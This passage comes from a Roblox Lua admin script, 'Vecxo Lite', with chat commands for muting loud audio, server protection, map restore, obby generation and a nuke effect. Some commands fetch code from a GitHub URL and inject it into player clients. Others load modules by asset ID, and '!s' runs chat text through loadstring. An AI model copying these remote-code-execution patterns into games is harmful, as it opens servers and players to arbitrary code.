		local message2 = Instance.new("Hint", workspace)
		message2.Text = "[Vecxo Lite]: - ✅ Reloaded Vecxo Lite successfully"
		task.wait(3)
		message2:Destroy()
	elseif cmd == "!antiloudnoise" and args[2] then
		local arg = args[2]:lower()
		if arg == "true" then
			if _G.antiloud then
				notifyv2(sender, "[Vecxo Lite]:", "⚠️ Anti noise is already enabled")
				return
			end
			_G.antiloud = true
			plr = sender
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			if not ReplicatedStorage:FindFirstChild("LoudSoundDetected") then
				local remote = Instance.new("RemoteEvent")
				remote.Name = "LoudSoundDetected"
				remote.Parent = ReplicatedStorage
			end
			local HttpService = game:GetService("HttpService")
			local code
			local success, err = pcall(function()
				code = HttpService:GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/AntiLoudAPIV2")
			end)
			if not success then
				notifyv2(sender, "[Vecxo Lite]:", "Failed to fetch code: " .. err)
				return
			end
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112691275102014).load()
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end
			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end
			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
			loa.Parent = scr
			scr:WaitForChild("Exec").Value = code
			scr.Parent = plr:WaitForChild("PlayerGui")
			scr.Enabled = true
			local remote = ReplicatedStorage:WaitForChild("LoudSoundDetected")
			if not _G.loudHooked then
				ReplicatedStorage.LoudSoundDetected.OnServerEvent:Connect(function(player, soundId)
					for _, v in ipairs(workspace:GetDescendants()) do
						if v:IsA("Sound") and v.SoundId == soundId and not v:IsDescendantOf(ReplicatedStorage) then
							for _, existingHint in pairs(workspace:GetChildren()) do
								if existingHint:IsA("Hint") and existingHint.Name == "VecxoHint" then
									existingHint:Destroy()
								end
							end
							local hint = Instance.new("Hint", workspace)
							hint.Name = "VecxoHint"
							local assetName = getSoundNameFromId(v.SoundId)
							local displayName = assetName or ("Unknown Sound (" .. v.SoundId .. ")")
							v.Volume = 0
							v:Destroy()
							hint.Text = "[Vecxo Lite]: ✅ Muted audio automatically - (" .. displayName .. ")"
							task.delay(4.7, function() hint:Destroy() end)
						end
					end
				end)
				_G.loudHooked = true
			end
			abc = sender.CharacterAdded:Connect(function()
				if not _G.antiloud then abc:Disconnect() return end
				plr = sender
				task.wait(1)

				local success, err = pcall(function()
					code = HttpService:GetAsync("https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/AntiLoudAPIV2")
				end)

				if not success then
					notifyv2(sender, "[Vecxo Lite]:", "Failed to fetch code: " .. err)
					return
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
				if not goog then
					warn("goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
				loa.Parent = scr
				scr:WaitForChild("Exec").Value = code
				scr.Parent = plr:WaitForChild("PlayerGui")
				scr.Enabled = true
			end)
			task.spawn(function()
				while _G.antiloud do
					task.wait(0.3)
					for _, sound in ipairs(workspace:GetDescendants()) do
						if sound:IsA("Sound") then
							if sound.Pitch ~= 1 then
								sound.Pitch = 1
								local hint = Instance.new("Hint", workspace)
								hint.Name = "VecxoHint"
								local assetName = getSoundNameFromId(sound.SoundId)
								local displayName = assetName or ("Unknown Sound (" .. sound.SoundId .. ")")
								hint.Text = "[Vecko Lite]: Fixed pitch of audio automatically - (" .. displayName .. ")"
								task.delay(4.7, function() hint:Destroy() end)
							end
						end
					end
				end
			end)
			notify(sender, "[Vecxo Lite]:", "✅ Anti noise (loudness-based) is enabled")
			local hint = Instance.new("Hint", workspace)
			hint.Text = "[Vecxo Lite]: - Anti noise (loudness-based) is enabled"
			hint.Name = "NOLoudmusic"
			task.delay(4, function() hint:Destroy() end)
		elseif arg == "false" then
			if not _G.antiloud then
				notifyv2(sender, "[Vecxo Lite]:", "Anti noise is already disabled")
				return
			end

			_G.antiloud = false

			if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				local rnpos = sender.Character.HumanoidRootPart.CFrame

				for _, v in ipairs(sender.Character:GetChildren()) do
					if v:IsA("Accessory") then
						pcall(function() v:Destroy() end)
					end
				end

				for _, item in ipairs(workspace:GetDescendants()) do
					if (item:IsA("Accessory") or item:IsA("Hat")) and item:FindFirstChild("Handle") and item.Handle:IsDescendantOf(workspace) then
						if item.Name == sender.Character or item.Handle.Name == sender.Character then
							pcall(function() item:Destroy() end)
						end
					end
				end

				sender:LoadCharacter()
				task.wait()
				if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
					sender.Character.HumanoidRootPart.CFrame = rnpos
				end
			else
				sender:LoadCharacter()
			end
			notify(sender, "[Vecxo Lite]:", "Anti noise is disabled")
			local hint = Instance.new("Hint", workspace)
			hint.Text = "[Vecxo Lite]: | Anti noise (loudness-based) is disabled"
			hint.Name = "NOLoudmusic"
			task.delay(4, function() hint:Destroy() end)
		else
			notifyv2(sender, "[Vecxo Lite]:", "⚠️ Usage: !antiloudnoise true/false")
		end
	elseif cmd == "!serverprotection" then
		local desiredState = args[2]
		if desiredState == "true" then
			if serverprotection then
				notify(sender, "[Vecxo Lite]: ", "✅ Server protection is already enabled.")
				return
			end
			serverprotection = true
			for _, player in ipairs(Players:GetPlayers()) do
				setupPlayer(player)
				notify(player, "[Vecxo Lite]: ", "⚠️ Server protection enabled, abusing will not be allowed.")
			end
			if not playerConnections.PlayerAddedConn then
				playerConnections.PlayerAddedConn = Players.PlayerAdded:Connect(function(player)
					setupPlayer(player)
					notify(player, "[Vecxo Lite]: ", "⚠️ Server protection enabled, abusing will not be allowed.")
				end)
			end
			task.spawn(function()
				while true do
					if serverprotection and not debrisProtectionRunning then
						debrisProtectionRunning = true
						while serverprotection do
							local all = workspace:GetDescendants()
							if #all > 1000 then
								for _, inst in ipairs(all) do
									if inst:IsA("BasePart") and not inst.Anchored then
										local parentModel = inst:FindFirstAncestorOfClass("Model")
										if parentModel and game.Players:GetPlayerFromCharacter(parentModel) then continue end
										if inst:IsDescendantOf(game:GetService("Players")) then continue end
										if inst:IsDescendantOf(workspace.CurrentCamera) then continue end
										if inst:IsA("Accessory") or inst:IsA("Tool") then continue end
										inst.Anchored = true
									end
								end
							end
							task.wait(0.3)
						end
						debrisProtectionRunning = false
					end
					task.wait(0.3)
				end
			end)
		elseif desiredState == "false" then
			if not serverprotection then
				notifyv2(sender, "[Vecxo Lite]: ", "❌ Server protection is already disabled.")
				return
			end
			serverprotection = false
			debrisProtectionRunning = false
			warnings = {}
			cleanupConnections()
			notifyv2(sender, "[Vecxo Lite]: ", "❌ Server protection disabled.")
		else
			notifyv2(sender, "[Vecxo Lite]: ", "⚠️ Invalid argument. Use `!serverprotection true` or `!serverprotection false`.")
		end
	elseif cmd == "!backpack" then
		local targets = GetPlayers(args[2], sender)
		local option = args[3]

		if option ~= "true" and option ~= "false" then
			notifyv2(sender, "[Vecxo Lite]: ", "⚠️ The values are true or false! example: !backpack plr true")
		end

		for i, plr in ipairs(targets) do
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112691275102014).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = string.format([[
				game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, %s)
				script:Destroy()
			]], option)

			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end
			scr.Enabled = true
			--	notifyv2(sender, "[Vecko Lite]: ", "✅ "..plr.DisplayName.."'s backpack has been set to - "..args[3])
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. "'s backpack has been set to - "..args[3]))
	elseif cmd == "!restoremap" then
		if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Tabby") then
			require(87631077502363).load("Kah")
		end

		local Tabby = workspace:FindFirstChild("Tabby")
		local _Game = workspace.Terrain:FindFirstChild("_Game")

		if not (Tabby and _Game) then
			game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Kah"):FindFirstChild("Tabby"):Clone().Parent = workspace
			game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Kah"):FindFirstChild("_Game"):Clone().Parent = workspace.Terrain

			if game:GetService("ServerScriptService"):FindFirstChild("Touch Kohls Admin") then
				game:GetService("ServerScriptService"):FindFirstChild("Touch Kohls Admin").Enabled = false
				task.wait()
				game:GetService("ServerScriptService"):FindFirstChild("Touch Kohls Admin").Enabled = true
			end

			if game:GetService("ServerScriptService"):FindFirstChild("Killer") then
				game:GetService("ServerScriptService"):FindFirstChild("Killer").Enabled = false
				task.wait()
				game:GetService("ServerScriptService"):FindFirstChild("Killer").Enabled = true
			end 

			if game:GetService("ServerScriptService"):FindFirstChild("Regen") then
				game:GetService("ServerScriptService"):FindFirstChild("Regen").Enabled = false
				task.wait()
				game:GetService("ServerScriptService"):FindFirstChild("Regen").Enabled = true
			end 

			return
		end

		game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Kah"):FindFirstChild("Tabby"):Clone().Parent = workspace
		Tabby:Destroy()

		game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Kah"):FindFirstChild("_Game"):Clone().Parent = workspace.Terrain
		_Game:Destroy()

		if game:GetService("ServerScriptService"):FindFirstChild("Touch Kohls Admin") then
			game:GetService("ServerScriptService"):FindFirstChild("Touch Kohls Admin").Enabled = false
			task.wait()
			game:GetService("ServerScriptService"):FindFirstChild("Touch Kohls Admin").Enabled = true
		end 

		if game:GetService("ServerScriptService"):FindFirstChild("Killer") then
			game:GetService("ServerScriptService"):FindFirstChild("Killer").Enabled = false
			task.wait()
			game:GetService("ServerScriptService"):FindFirstChild("Killer").Enabled = true
		end 

		if game:GetService("ServerScriptService"):FindFirstChild("Regen") then
			game:GetService("ServerScriptService"):FindFirstChild("Regen").Enabled = false
			task.wait()
			game:GetService("ServerScriptService"):FindFirstChild("Regen").Enabled = true
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Map has been restored")
	elseif cmd == "!gobby" then
		local basePos = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") and sender.Character.HumanoidRootPart.Position or Vector3.new(0, 10, 0)
		local spacing = 10
		local height = 5
		local blocks = {}

		local function createSpherePlatform(position, color)
			local part = Instance.new("Part")
			part.Size = Vector3.new(6, 1, 4)
			part.Anchored = true
			part.Position = position
			part.Material = Enum.Material.Neon
			part.BrickColor = color or BrickColor.Random()
			part.Name = "JumpPart"

			local mesh = Instance.new("SpecialMesh")
			mesh.MeshType = Enum.MeshType.Cylinder
			mesh.Parent = part

			part.Parent = workspace
			task.spawn(function()
				while part and part.Parent do
					part.CFrame = part.CFrame * CFrame.Angles(0, math.rad(2), 0)
					task.wait(0.03)
				end
			end)
			return part
		end

		local function createDisappearTile(position)
			local part = createSpherePlatform(position, BrickColor.Random())
			local cooldown = false

			part.Touched:Connect(function(hit)
				local hum = hit.Parent:FindFirstChild("Humanoid")
				if hum and not cooldown then
					cooldown = true
					local originalTransparency = part.Transparency
					local originalCanCollide = part.CanCollide

					task.delay(0.3, function()
						part.CanCollide = false
						part.Transparency = 1
						task.wait(3)
						part.CanCollide = originalCanCollide
						part.Transparency = originalTransparency
						cooldown = false
					end)
				end
			end)

			return part
		end


		local function createRotatingPlatform(position)
			local part = Instance.new("Part")
			part.Size = Vector3.new(3, 1, 4)
			part.Position = position
			part.Anchored = true
			part.BrickColor = BrickColor.new("Bright yellow")
			part.Material = Enum.Material.Neon
			part.Name = "RotatingPlatform"
			part.Parent = workspace
			local v = Instance.new("BodyVelocity")
			v.Velocity = Vector3.new(40, 0, 0)
			v.MaxForce = Vector3.new(1e9, 0, 0)
			v.Parent = part
			task.spawn(function()
				while part and part.Parent do
					part.CFrame = part.CFrame * CFrame.Angles(0, math.rad(2), 0)
					task.wait(0.03)
				end
			end)
			return part
		end

		for i = 1, 30 do
			local position = basePos + Vector3.new(i * spacing, i * height * 0.2, 0)
			local part

			if i % 3 == 0 then
				part = createDisappearTile(position)
			else
				part = createDisappearTile(position)
			end

			table.insert(blocks, part)

			if i % 1 == 0 then
				local killPart = Instance.new("Part")
				killPart.Size = Vector3.new(1, 3.8, 11)
				killPart.Position = part.Position + Vector3.new(-spacing / 2, 1, 0)
				killPart.Anchored = true
				killPart.BrickColor = BrickColor.new("Really red")
				killPart.Material = Enum.Material.Neon
				killPart.Name = "KillBrick"
				killPart.Touched:Connect(function(hit)
					local hum = hit.Parent:FindFirstChildOfClass("Humanoid")
					if hum then hum.Health = 0 end
				end)
				killPart.Parent = workspace
			end

			if i % 4 == 0 then
				createRotatingPlatform(part.Position + Vector3.new(0, 0, 0))
				part.Transparency = 1
			end
		end

		local lastPart = blocks[#blocks]
		local rainbowStart = lastPart and lastPart.Position or basePos + Vector3.new(30 * spacing, 0, 0)

		local function createRainbowFadeStep(position, delayOffset)
			local part = Instance.new("Part")
			part.Size = Vector3.new(4, 1, 4)
			part.Anchored = true
			part.Position = position
			part.Material = Enum.Material.Neon
			part.Name = "RainbowStep"
			part.BrickColor = BrickColor.Random()
			part.Parent = workspace

			local cooldown = false
			part.Touched:Connect(function(hit)
				local hum = hit.Parent:FindFirstChild("Humanoid")
				if hum and not cooldown then
					cooldown = true
					local origColor = part.BrickColor
					local origTransparency = part.Transparency

					for i = 1, 10 do
						part.Transparency = i / 10
						task.wait(0.02)
					end
					part.CanCollide = false

					task.delay(2 + delayOffset, function()
						for i = 10, 1, -1 do
							part.Transparency = i / 10
							task.wait(0.05)
						end
						part.CanCollide = true
						part.BrickColor = origColor
						part.Transparency = origTransparency
						cooldown = false
					end)
				end
			end)

			return part
		end

		local turns = 5
		local stepsPerTurn = 16
		local spiralSteps = stepsPerTurn * turns
		local radius = 10
		local angleStep = math.rad(360 / stepsPerTurn) 
		local verticalStep = 1.5

		local lastPart = blocks[#blocks]
		local spiralCenter = lastPart and lastPart.Position or basePos

		local lastSpiralPos = nil

		for i = 1, spiralSteps do
			local angle = i * angleStep
			local x = math.cos(angle) * radius
			local z = math.sin(angle) * radius
			local y = i * verticalStep
			local position = spiralCenter + Vector3.new(x, y, z)

			lastSpiralPos = position
			createRainbowFadeStep(position, i * 0.1)
		end

		-- === 3-Way Split Path Challenge v2 ===
		local stageStartPos = lastSpiralPos or (basePos + Vector3.new(0, 60, 0))
		local challengeStart = stageStartPos + Vector3.new(0, 4, 0) -- lowered Y offset
		local spacingBetweenRooms = 14
		local laneOffset = 10
		local currentY = challengeStart.Y
		local currentZ = challengeStart.Z

		math.randomseed(tick())

		for stage = 1, 3 do
			-- Add a decision platform before each set
			local decisionPad = Instance.new("Part")
			decisionPad.Size = Vector3.new(18, 1, 8)
			decisionPad.Anchored = true
			decisionPad.Material = Enum.Material.SmoothPlastic
			decisionPad.BrickColor = BrickColor.new("Medium stone grey")
			decisionPad.Position = Vector3.new(stageStartPos.X, currentY, currentZ)
			decisionPad.Name = "DecisionPad"
			decisionPad.Parent = workspace

			currentZ = currentZ + spacingBetweenRooms

			local correctLane = math.random(1, 3)

			for lane = 1, 3 do
				local offsetX = (lane - 2) * laneOffset
				local part = Instance.new("Part")
				part.Size = Vector3.new(6, 1, 12)
				part.Anchored = true
				part.Material = Enum.Material.Neon
				part.BrickColor = BrickColor.new((lane == correctLane) and "Institutional white" or "Institutional white")
				part.Position = Vector3.new(stageStartPos.X + offsetX, currentY, currentZ)
				part.Name = (lane == correctLane) and "SafeTile" or "KillTile"
				part.Parent = workspace

				if lane ~= correctLane then
					part.Touched:Connect(function(hit)
						local hum = hit.Parent:FindFirstChildOfClass("Humanoid")
						if hum then
							hum.Health = 0
							part.Transparency = 1
							part.CanCollide = false
							task.delay(1, function()
								if part and part.Parent then
									part.Transparency = 0
									part.CanCollide = true
								end
							end)
						end
					end)
				end
			end

			currentZ = currentZ + spacingBetweenRooms
		end

		local spinnerStartZ = currentZ 
		local spinnerCount = 4
		local spinnerSpacing = 18
		local bladeLength = 12
		local pathY = currentY


		for i = 1, spinnerCount do
			local zPos = spinnerStartZ + (i - 1) * spinnerSpacing

			-- Base platform under the spinner
			local base = Instance.new("Part")
			base.Size = Vector3.new(12, 1, 12)
			base.Position = Vector3.new(stageStartPos.X, pathY, zPos)
			base.Anchored = true
			base.Material = Enum.Material.SmoothPlastic
			base.BrickColor = BrickColor.new("Dark stone grey")
			base.Name = "SpinnerBase"
			base.Parent = workspace

			-- Rotating blade
			local blade = Instance.new("Part")
			blade.Size = Vector3.new(bladeLength, 0.4, 1)
			blade.Position = base.Position + Vector3.new(0, 2, 0)
			blade.Anchored = true
			blade.Material = Enum.Material.Metal
			blade.BrickColor = BrickColor.new("Really black")
			blade.Name = "Blade"
			blade.Parent = workspace

			-- Optional kill effect
			blade.Touched:Connect(function(hit)
				local hum = hit.Parent:FindFirstChildOfClass("Humanoid")
				if hum then
					hum.Health = 0
				end
			end)

			-- Spin using RunService heartbeat
			local angle = 0
			local speed = math.random(3, 4.5) * (math.random(0, 1) == 0 and 1 or -1)

			game:GetService("RunService").Heartbeat:Connect(function(dt)
				if blade and blade.Parent then
					angle += dt * speed
					blade.CFrame = CFrame.new(base.Position + Vector3.new(0, 2, 0)) * CFrame.Angles(0, angle, 0)
				end
			end)
		end

		-- Update currentZ so the next section starts further ahead
		currentZ = spinnerStartZ + spinnerCount * spinnerSpacing

		task.wait(.1)


		local finalWinPos = Vector3.new(stageStartPos.X, currentY + 5, currentZ)

		local winPart = Instance.new("Part")
		winPart.Size = Vector3.new(10, 1, 10)
		winPart.Anchored = true
		winPart.Position = finalWinPos
		winPart.BrickColor = BrickColor.new("Lime green")
		winPart.Material = Enum.Material.Neon
		winPart.Name = "WIN"
		winPart.Parent = workspace

		local text = Instance.new("BillboardGui", winPart)
		text.Size = UDim2.new(0, 200, 0, 50)
		text.StudsOffset = Vector3.new(0, 3, 0)
		text.AlwaysOnTop = true

		local label = Instance.new("TextLabel", text)
		label.Size = UDim2.new(1, 0, 1, 0)
		label.Text = "🏁 YOU WIN 🏁"
		label.TextColor3 = Color3.new(1, 1, 1)
		label.BackgroundTransparency = 1
		label.Font = Enum.Font.Arcade
		label.TextScaled = true
		label.Parent = text

		notifyv2(sender, "[Vecko Lite]: :", "Generated obby successfully")

		winPart.Touched:Connect(function(hit)
			local player = game.Players:GetPlayerFromCharacter(hit.Parent)
			if player then
				local hint=Instance.new("Hint",game.workspace)
				hint.Text = player.Name.." beat the pro obby B-)" 
				task.wait(3)
				hint:Destroy()
			end
		end)
	elseif cmd == "!s" then
		local code = msg:sub(4)
		if code == "" then
			task.spawn(function()
				GraphicalEffects.CrystalRing(sender, "Really red", 2)
			end)
			notifyv2(sender, "[Vecxo Lite]: ", "❌ No code provided.")
			return
		end

		local success, err = pcall(function()
			loadstring(code)()
		end)

		if success then
			task.spawn(function()
				GraphicalEffects.CrystalRing(sender, "Lime green", 2)
			end)
			notifyv2(sender, "[Vecxo Lite]: ", "✅ Code ran successfully")
		else
			task.spawn(function()
				GraphicalEffects.CrystalRing(sender, "Really red", 2)
			end)
			notifyv2(sender, "[Vecxo Lite]: ", "❌ Issue executing code: " .. err)
		end

	elseif cmd == "!re" then
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecko Lite]: ", "❌ Player(s) '" .. args[2] .. "' not found.")
			return
		end
		for _, targetPlayer in ipairs(targets) do
			refreshPlayer(targetPlayer)
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Refreshed " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!cmds" then
		showCommandGui(sender)
	elseif cmd == "!bans" then
		showBannedList(sender, bannedPlayers)
	elseif cmd == "!plrlist" then
		showPlayerList(sender)
	elseif cmd == "!nuke" then
		local explosionSize = 100
		local target = args[2]
		local args = args[3] or "100"

		if args[3] then
			args = args[3]
		end

		if not args[2] or target == "me" then
			target = sender.Name
		end

		local argt = GetPlayers(args[2], sender)

		if #argt > 0 then
			target = argt[1]
		end

		-- Nuke Script by ccuser44 (github/ccuser44/Fast-nuclear-explosion), MIT License
		local Lighting = game:GetService("Lighting")
		local SoundService = game:GetService("SoundService")
		local TweenService = game:GetService("TweenService")
		local Debris = game:GetService("Debris")

		-- Constants
		local CLOUD_RING_MESH_ID = "rbxassetid://3270017"
		local CLOUD_SPHERE_MESH_ID = "rbxassetid://1185246"
		local CLOUD_MESH_ID = "rbxassetid://1095708"
		local CLOUD_COLOR_TEXTURE = "rbxassetid://1361097"

		-- Variables
		local basePart = Instance.new("Part")
		basePart.Anchored = true
		basePart.Locked = true
		basePart.CanCollide = false
		basePart.CanQuery = false
		basePart.CanTouch = false
		basePart.TopSurface = Enum.SurfaceType.Smooth
		basePart.BottomSurface = Enum.SurfaceType.Smooth
		basePart.Size = Vector3.new(1, 1, 1)

		local baseMesh = Instance.new("SpecialMesh")
		baseMesh.MeshType = Enum.MeshType.FileMesh

		local sphereMesh, ringMesh = baseMesh:Clone(), baseMesh:Clone()
		sphereMesh.MeshId = CLOUD_SPHERE_MESH_ID
		ringMesh.MeshId = CLOUD_RING_MESH_ID

		local cloudMesh = baseMesh:Clone()
		cloudMesh.MeshId, cloudMesh.TextureId = CLOUD_MESH_ID, CLOUD_COLOR_TEXTURE
		cloudMesh.VertexColor = Vector3.new(0.9, 0.6, 0)

		local skybox = Instance.new("Sky")
		skybox.SkyboxFt, skybox.SkyboxBk = "rbxassetid://1012887", "rbxassetid://1012890"
		skybox.SkyboxLf, skybox.SkyboxRt = "rbxassetid://1012889", "rbxassetid://1012888"
		skybox.SkyboxDn, skybox.SkyboxUp = "rbxassetid://1012891", "rbxassetid://1014449"

		local nukeSkyboxes, realSkyboxes = setmetatable({}, {__mode = "v"}), setmetatable({}, {__mode = "v"})
		local nukeIgnore = setmetatable({}, {__mode = "v"})
		local explosionParams = OverlapParams.new()
		explosionParams.FilterDescendantsInstances = nukeIgnore
		explosionParams.FilterType = Enum.RaycastFilterType.Exclude
		explosionParams.RespectCanCollide = true

		-- Functions
		local function basicTween(instance, properties, duration)
			local tween = TweenService:Create(
				instance,
				TweenInfo.new(
					duration,
					Enum.EasingStyle.Linear,
					Enum.EasingDirection.In,
					0,
					false,
					0
				),
				properties
			)
			tween:Play()
			if tween.PlaybackState == Enum.PlaybackState.Playing or tween.PlaybackState == Enum.PlaybackState.Begin then
				tween.Completed:Wait()
			end
		end

		local function createMushroomCloud(position, container, clouds, shockwave)
			local baseCloud = basePart:Clone()
			baseCloud.Position = position

			local poleBase = basePart:Clone()
			poleBase.Position = position + Vector3.new(0, 0.1, 0)

			local cloud1 = basePart:Clone()
			cloud1.Position = position + Vector3.new(0, 0.75, 0)

			local cloud2 = basePart:Clone()
			cloud2.Position = position + Vector3.new(0, 1.25, 0)

			local cloud3 = basePart:Clone()
			cloud3.Position = position + Vector3.new(0, 1.7, 0)

			local poleRing = basePart:Clone()
			poleRing.Position = position + Vector3.new(0, 1.3, 0)
			poleRing.Transparency = 0.2
			poleRing.BrickColor = BrickColor.new("Dark stone grey")
			poleRing.CFrame = poleRing.CFrame * CFrame.Angles(math.rad(90), 0, 0)

			local mushCloud = basePart:Clone()
			mushCloud.Position = position + Vector3.new(0, 2.3, 0)

			local topCloud = basePart:Clone()
			topCloud.Position = position + Vector3.new(0, 2.7, 0)

			do
				local baseCloudMesh = cloudMesh:Clone()
				baseCloudMesh.Parent = baseCloud 
				baseCloudMesh.Scale = Vector3.new(2.5, 1, 4.5)

				local poleBaseMesh = cloudMesh:Clone()
				poleBaseMesh.Scale = Vector3.new(1.25, 2, 2.5)
				poleBaseMesh.Parent = poleBase

				local cloud1Mesh = cloudMesh:Clone()
				cloud1Mesh.Scale = Vector3.new(0.5, 3, 1)
				cloud1Mesh.Parent = cloud1

				local cloud2Mesh = cloudMesh:Clone()
				cloud2Mesh.Scale = Vector3.new(0.5, 1.5, 1)
				cloud2Mesh.Parent = cloud2

				local cloud3Mesh = cloudMesh:Clone()
				cloud3Mesh.Scale = Vector3.new(0.5, 1.5, 1)
				cloud3Mesh.Parent = cloud3

				local poleRingMesh = ringMesh:Clone()
				poleRingMesh.Scale = Vector3.new(1.2, 1.2, 1.2)
				poleRingMesh.Parent = poleRing

				local topCloudMesh = cloudMesh:Clone()
				topCloudMesh.Scale = Vector3.new(7.5, 1.5, 1.5)
				topCloudMesh.Parent = topCloud

				local mushCloudMesh = cloudMesh:Clone()
				mushCloudMesh.Scale = Vector3.new(2.5, 1.75, 3.5)
				mushCloudMesh.Parent = mushCloud
			end

			table.insert(clouds, baseCloud)
			table.insert(clouds, topCloud)
			table.insert(clouds, mushCloud)
			table.insert(clouds, cloud1)
			table.insert(clouds, cloud2)
			table.insert(clouds, cloud3)
			table.insert(clouds, poleBase)
			table.insert(clouds, poleRing)

			local bigRing = basePart:Clone()
			bigRing.Position = position
			bigRing.CFrame = bigRing.CFrame * CFrame.Angles(math.rad(90), 0, 0)

			local smallRing = basePart:Clone()
			smallRing.Position = position
			smallRing.BrickColor = BrickColor.new("Dark stone grey")
			smallRing.CFrame = smallRing.CFrame * CFrame.Angles(math.rad(90), 0, 0)

			local innerSphere = basePart:Clone()
			innerSphere.Position = position
			innerSphere.BrickColor = BrickColor.new("Bright orange")
			innerSphere.Transparency = 0.5

			local outterSphere = basePart:Clone()
			outterSphere.Position = position
			outterSphere.BrickColor = BrickColor.new("Bright orange")
			outterSphere.Transparency = 0.5

			do
				local bigMesh = ringMesh:Clone()
				bigMesh.Scale = Vector3.new(5, 5, 1)
				bigMesh.Parent = bigRing

				local smallMesh = ringMesh:Clone()
				smallMesh.Scale = Vector3.new(4.6, 4.6, 1.5)
				smallMesh.Parent = smallRing

				local innerSphereMesh = sphereMesh:Clone()	
				innerSphereMesh.Scale = Vector3.new(-6.5, -6.5, -6.5)
				innerSphereMesh.Parent = innerSphere

				local outterSphereMesh = sphereMesh:Clone()
				outterSphereMesh.Scale = Vector3.new(6.5, 6.5, 6.5)
				outterSphereMesh.Parent = outterSphere
			end

			table.insert(shockwave, bigRing)	
			table.insert(shockwave, smallRing)
			table.insert(shockwave, outterSphere)
			table.insert(shockwave, innerSphere)

			for _, v in ipairs(shockwave) do
				v.Parent = container
			end
			for _, v in ipairs(clouds) do
				v.Parent = container
			end

			return {
				OutterSphere = outterSphere,
				InnerSphere = innerSphere,
				BigRing = bigRing,
				SmallRing = smallRing,
				BaseCloud = baseCloud,
				PoleBase = poleBase,
				PoleRing = poleRing,
				Cloud1 = cloud1,
				Cloud2 = cloud2,
				Cloud3 = cloud3,
				MushCloud = mushCloud,
				TopCloud = topCloud
			}
		end

		local function effects(nolighting)
			for i = 1, 2 do
				local explosionSound = Instance.new("Sound")
				explosionSound.Name = "NUKE_SOUND"
				explosionSound.SoundId = "http://www.roblox.com/asset?id=130768997"
				explosionSound.Volume = 0.5
				explosionSound.PlaybackSpeed = i / 2
				explosionSound.RollOffMinDistance, explosionSound.RollOffMaxDistance = 0, 10000
				explosionSound.Archivable = false
				explosionSound.Parent = SoundService
				explosionSound:Play()
				Debris:AddItem(explosionSound, 30)
			end

			if not nolighting then
				local oldBrightness = Lighting.Brightness
				Lighting.Brightness = 5
				basicTween(Lighting, {Brightness = 1}, 4 / 0.01 * (1 / 60))
				Lighting.Brightness = oldBrightness
			end
		end

		local function tagHumanoid(humanoid, attacker)
			local creatorTag = Instance.new("ObjectValue")
			creatorTag.Name = "creator"
			creatorTag.Value = attacker
			Debris:AddItem(creatorTag, 2)
			creatorTag.Parent = humanoid
		end

		local function destruction(position, radius, attacker)
			for _, v in ipairs(workspace:GetPartBoundsInRadius(position, radius, explosionParams)) do
				if v.ClassName ~= "Terrain" and v.Anchored == false then
					if attacker then
						local humanoid = v.Parent:FindFirstChildOfClass("Humanoid")
						if humanoid and not humanoid:FindFirstChild("creator") then
							tagHumanoid(humanoid, attacker)
						end
					end
					v:BreakJoints()
					v.Material = Enum.Material.CorrodedMetal
					v.AssemblyLinearVelocity = CFrame.new(v.Position, position):VectorToWorldSpace(Vector3.new(math.random(-5, 5), 5, 1000))
				end
			end
		end

		local function explode(position: Vector3, explosionSize: number, nolighting: boolean?, attacker: (Player | Humanoid)?)
			local shockwaveCompleted = false
			explosionParams.FilterDescendantsInstances = nukeIgnore
			local clouds, shockwave = {}, {}
			local container = Instance.new("Model")
			container.Name = "ADONIS_NUCLEAREXPLOSION"
			container.Archivable = false
			container.ModelStreamingMode = Enum.ModelStreamingMode.Atomic
			container.Parent = workspace
			table.insert(nukeIgnore, container)

			local cloudData = createMushroomCloud(position, container, clouds, shockwave)
			local outterSphere, innerSphere, bigRing, smallRing = cloudData.OutterSphere, cloudData.InnerSphere, cloudData.BigRing, cloudData.SmallRing
			local baseCloud, poleBase, poleRing = cloudData.BaseCloud, cloudData.PoleBase, cloudData.PoleRing
